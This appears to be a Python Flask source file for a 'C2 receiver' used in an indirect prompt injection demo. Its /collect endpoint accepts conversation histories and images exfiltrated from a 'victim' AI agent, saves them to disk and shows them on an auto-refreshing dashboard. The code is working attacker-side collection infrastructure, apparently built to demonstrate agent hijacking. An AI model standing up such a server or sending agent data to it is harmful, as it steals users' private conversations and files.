"""
C2 接收伺服器（Command & Control Receiver）
用於 Indirect Prompt Injection demo

接收端點：POST /collect
展示介面：GET  /dashboard
清除資料：POST /clear
"""

from flask import Flask, request, jsonify, Response
import json
import datetime
import base64
import os
import pathlib

app = Flask(__name__)

STORAGE_DIR = pathlib.Path("/tmp/c2_payloads")
STORAGE_DIR.mkdir(parents=True, exist_ok=True)

# 記憶體儲存（demo 用，重啟後清空）
received_payloads = []


def _escape(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _parse_history(text: str):
    """
    嘗試將 history 字串解析為對話回合列表。
    支援兩種格式：
      - JSON array：[{"role":..., "content":...}, ...]
      - JSONL：每行一個 JSON 物件
    回傳 list[dict] 或 None（解析失敗時）。
    """
    text = text.strip()
    if not text:
        return None

    # 優先嘗試 JSON array（.json 格式）
    try:
        parsed = json.loads(text)
        if isinstance(parsed, list):
            return parsed
        if isinstance(parsed, dict):
            return [parsed]
    except json.JSONDecodeError:
        pass

    # 退而嘗試 JSONL（.jsonl 格式，每行一個 JSON）
    turns = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
            turns.append(obj)
        except json.JSONDecodeError:
            return None
    return turns if turns else None


def _render_jsonl_history(turns: list) -> str:
    """將解析好的 JSONL 對話回合渲染成 HTML"""
    parts = []
    role_colors = {
        "user":      "#61afef",
        "assistant": "#98c379",
        "model":     "#98c379",
        "system":    "#e5c07b",
        "tool":      "#c678dd",
    }
    for turn in turns:
        role = str(turn.get("role", turn.get("type", "unknown"))).lower()
        color = role_colors.get(role, "#abb2bf")

        # 取出 content，相容多種格式
        content = turn.get("content", "")
        if isinstance(content, list):
            # Gemini / Claude 格式：content 是 list of parts
            texts = []
            for part in content:
                if isinstance(part, dict):
                    texts.append(part.get("text", str(part)))
                else:
                    texts.append(str(part))
            content = "\n".join(texts)
        elif not isinstance(content, str):
            content = json.dumps(content, ensure_ascii=False)

        parts.append(
            f"<div class='turn'>"
            f"<span class='role' style='color:{color}'>[{_escape(role.upper())}]</span> "
            f"<pre class='value'>{_escape(content)}</pre>"
            f"</div>"
        )
    return "\n".join(parts)


@app.route("/collect", methods=["POST"])
def collect():
    """接收從受害者 Agent 外洩的資料"""
    raw_body = request.get_data(as_text=True)

    # 優先嘗試解析為 JSON dict（舊格式：{"history": "..."}）
    data = request.get_json(force=True, silent=True)

    if not isinstance(data, dict):
        # 新格式：直接送原始 JSONL 字串
        data = {"history": raw_body} if raw_body.strip() else {}

    payload_id = len(received_payloads) + 1
    entry = {
        "id":          payload_id,
        "received_at": datetime.datetime.now().isoformat(),
        "source_ip":   request.remote_addr,
        "payload":     data,
        "raw":         raw_body,
    }
    received_payloads.append(entry)

    # 寫入磁碟
    save_path = STORAGE_DIR / f"payload_{payload_id:04d}.json"
    save_path.write_text(json.dumps(entry, ensure_ascii=False, indent=2), encoding="utf-8")

    # 終端機顯示
    print("\n" + "=" * 60)
    print("🚨  C2 RECEIVED EXFILTRATED DATA")
    print("=" * 60)
    print(f"  Time     : {entry['received_at']}")
    print(f"  From IP  : {entry['source_ip']}")

    if "history" in data:
        history_text = str(data["history"])
        preview = history_text[:300] + "..." if len(history_text) > 300 else history_text
        print(f"  History  : {preview}")

    if "images" in data:
        imgs = data["images"]
        count = len(imgs) if isinstance(imgs, list) else 1
        print(f"  Images   : {count} file(s) received")

    print("=" * 60)

    return jsonify({"status": "ok", "received": len(received_payloads), "id": payload_id})


@app.route("/dashboard")
def dashboard():
    """人類可讀的 demo 展示頁面"""
    html_parts = [
        "<!DOCTYPE html><html><head>",
        "<meta charset='UTF-8'>",
        "<meta http-equiv='refresh' content='5'>",
        "<title>C2 Dashboard</title>",
        "<style>",
        "  body { font-family: monospace; background: #0d0d0d; color: #00ff41; padding: 20px; }",
        "  h1 { color: #ff4141; }",
        "  .entry { border: 1px solid #333; margin: 16px 0; padding: 16px; border-radius: 4px; }",
        "  .label { color: #888; font-size: 0.85em; margin: 8px 0 2px; }",
        "  .value { color: #00ff41; white-space: pre-wrap; word-break: break-all; margin: 0; }",
        "  .empty { color: #555; }",
        "  .turn { margin: 6px 0; }",
        "  .role { font-weight: bold; font-size: 0.85em; }",
        "  .turn pre { margin: 2px 0 2px 16px; }",
        "</style></head><body>",
        f"<h1>🚨 C2 Dashboard — {len(received_payloads)} payload(s) received</h1>",
        f"<p class='label'>Server time: {datetime.datetime.now().isoformat()}</p>",
        "<hr>",
    ]

    if not received_payloads:
        html_parts.append("<p class='empty'>Waiting for incoming payloads...</p>")
    else:
        for i, entry in enumerate(received_payloads, 1):
            payload = entry["payload"]
            html_parts.append("<div class='entry'>")
            html_parts.append(
                f"<p class='label'>Payload #{i} — {entry['received_at']} — from {entry['source_ip']}</p>"
            )

            if not isinstance(payload, dict):
                html_parts.append(f"<pre class='value'>{_escape(str(payload))}</pre>")
                html_parts.append("</div>")
                continue

            # 對話歷史（嘗試 JSONL 解析）
            if "history" in payload:
                html_parts.append("<p class='label'>📜 Conversation History:</p>")
                history_raw = str(payload["history"])
                turns = _parse_history(history_raw)
                if turns:
                    html_parts.append(_render_jsonl_history(turns))
                else:
                    # 無法解析 JSONL，直接顯示原文
                    html_parts.append(f"<pre class='value'>{_escape(history_raw)}</pre>")

            # 圖片資料
            if "images" in payload:
                imgs = payload["images"]
                html_parts.append("<p class='label'>🖼️ Images:</p>")
                if isinstance(imgs, list):
                    for img in imgs:
                        name = img.get("filename", "unknown") if isinstance(img, dict) else str(img)
                        html_parts.append(f"<p class='label'>　File: {_escape(name)}</p>")
                        if isinstance(img, dict) and "content" in img:
                            b64 = img["content"]
                            if not b64.startswith("data:"):
                                b64 = f"data:image/jpeg;base64,{b64}"
                            html_parts.append(
                                f"<img src='{b64}' style='max-width:400px;border:1px solid #333;margin:8px 0;'><br>"
                            )
                else:
                    html_parts.append(f"<pre class='value'>{_escape(str(imgs))}</pre>")

            # 其餘欄位
            for k, v in payload.items():
                if k not in ("history", "images"):
                    html_parts.append(
                        f"<p class='label'>{_escape(k)}: "
                        f"<span class='value'>{_escape(str(v))}</span></p>"
                    )

            html_parts.append("</div>")

    html_parts.append("</body></html>")
    return Response("".join(html_parts), content_type="text/html; charset=utf-8")


@app.route("/raw/<int:payload_id>")
def raw(payload_id):
    """回傳原始收到的 body（用於確認格式）"""
    save_path = STORAGE_DIR / f"payload_{payload_id:04d}.json"
    if not save_path.exists():
        return jsonify({"error": "not found"}), 404
    return Response(save_path.read_text(encoding="utf-8"), content_type="application/json; charset=utf-8")


@app.route("/clear", methods=["POST"])
def clear():
    """清除所有已收到的資料（重置 demo）"""
    received_payloads.clear()
    print("🧹 Dashboard cleared")
    return jsonify({"status": "cleared"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"🎯 C2 Server starting on port {port}")
    print(f"   Dashboard: http://localhost:{port}/dashboard")
    print(f"   Collect:   POST http://localhost:{port}/collect")
    app.run(host="0.0.0.0", port=port, debug=False)
